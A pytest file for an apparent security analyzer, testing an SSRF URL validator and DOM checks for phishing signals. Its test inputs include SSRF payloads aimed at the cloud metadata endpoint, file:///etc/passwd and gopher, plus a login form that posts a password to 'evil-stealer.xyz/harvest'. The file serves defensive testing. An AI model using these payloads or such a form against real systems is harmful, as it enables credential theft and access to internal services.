import pytest
from analyzer.dom import validate_url_for_ssrf, SSRFValidationError, analyze_dom


def test_ssrf_blocks_private_ips():
    # 127.0.0.1
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("http://127.0.0.1:8080/admin")

    # 10.0.0.1
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("http://10.1.2.3/")

    # 192.168.1.1
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("https://192.168.1.1/")

    # 169.254.169.254 (cloud metadata)
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("http://169.254.169.254/latest/meta-data")


def test_ssrf_blocks_localhost_domain():
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("http://localhost:5000/")


def test_ssrf_blocks_invalid_schemes():
    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("file:///etc/passwd")

    with pytest.raises(SSRFValidationError):
        validate_url_for_ssrf("gopher://127.0.0.1:25")


def test_dom_insecure_transport():
    signals = analyze_dom("http://example.com/test", html="<html><body>Hello</body></html>")
    signal_ids = [s["id"] for s in signals]
    assert "DOM_INSECURE_TRANSPORT" in signal_ids


def test_dom_password_over_http():
    html = """
    <html>
      <body>
        <form action="/login" method="POST">
           <input type="text" name="user" />
           <input type="password" name="pass" />
        </form>
      </body>
    </html>
    """
    signals = analyze_dom("http://example.com/login", html=html)
    signal_ids = [s["id"] for s in signals]
    assert "DOM_PASSWORD_OVER_HTTP" in signal_ids
    assert "DOM_INSECURE_TRANSPORT" in signal_ids


def test_dom_form_action_mismatch():
    html = """
    <html>
      <body>
        <form action="https://evil-stealer.xyz/harvest" method="POST">
           <input type="password" name="secret" />
        </form>
      </body>
    </html>
    """
    signals = analyze_dom("https://bank-service.com/login", html=html)
    signal_ids = [s["id"] for s in signals]
    assert "DOM_FORM_ACTION_MISMATCH" in signal_ids


def test_dom_hidden_inputs():
    html = """
    <html>
      <body>
        <form action="/auth" method="POST">
           <input type="hidden" name="token1" value="a" />
           <input type="hidden" name="token2" value="b" />
           <input type="hidden" name="token3" value="c" />
           <input type="hidden" name="token4" value="d" />
        </form>
      </body>
    </html>
    """
    signals = analyze_dom("https://example.com/auth", html=html)
    signal_ids = [s["id"] for s in signals]
    assert "DOM_EXCESSIVE_HIDDEN_INPUTS" in signal_ids
